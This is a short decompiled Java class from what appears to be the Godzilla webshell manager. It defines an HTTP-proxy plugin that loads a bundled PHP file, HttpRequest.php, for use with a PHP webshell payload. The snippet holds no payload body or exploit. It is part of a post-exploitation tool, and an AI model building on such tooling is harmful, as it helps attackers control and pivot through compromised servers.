/*    */ package shells.plugins.php;
/*    */ 
/*    */ import core.annotation.PluginAnnotation;
/*    */ import java.io.IOException;
/*    */ import java.io.InputStream;
/*    */ import shells.plugins.generic.HttpProxy;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "HttpProxy", DisplayName = "Http代理")
/*    */ public class PHttpProxy
/*    */   extends HttpProxy
/*    */ {
/*    */   private static final String CLASS_NAME = "HttpRequest";
/*    */   
/*    */   public byte[] readPlugin() throws IOException {
/* 17 */     InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.php", new Object[] { "HttpRequest" }));
/* 18 */     byte[] data = functions.readInputStream(inputStream);
/* 19 */     inputStream.close();
/* 20 */     return data;
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public String getClassName() {
/* 26 */     return "HttpRequest";
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\PHttpProxy.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */